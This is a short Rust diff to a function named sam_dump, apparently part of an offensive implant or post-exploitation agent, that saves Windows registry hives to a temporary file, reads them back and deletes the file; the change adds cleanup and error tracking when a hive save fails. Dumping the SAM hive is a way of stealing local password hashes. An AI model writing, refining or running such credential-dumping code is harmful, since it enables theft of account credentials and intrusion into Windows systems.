@@ -179,12 +179,16 @@ fn sam_dump() -> TaskOutput {
         let sr = unsafe { fn_save(hkey, *tmp_path, core::ptr::null(), 1 /* REG_LATEST_FORMAT */) };
         let save_err = if sr != 0 { unsafe { GetLastError() } } else { 0 };
         unsafe { fn_close(hkey) };
-        let _ = save_err;
         let path_str = unsafe {
             let mut len = 0;
             while *tmp_path.add(len) != b'\0' { len += 1; }
             core::str::from_utf8_unchecked(core::slice::from_raw_parts(*tmp_path, len))
         };
+        if save_err != 0 {
+            let _ = std::fs::remove_file(path_str);
+            if first_err == 0 { first_err = save_err; }
+            continue;
+        }
         if let Ok(data) = std::fs::read(path_str) {
             let _ = std::fs::remove_file(path_str);
             let name = unsafe {
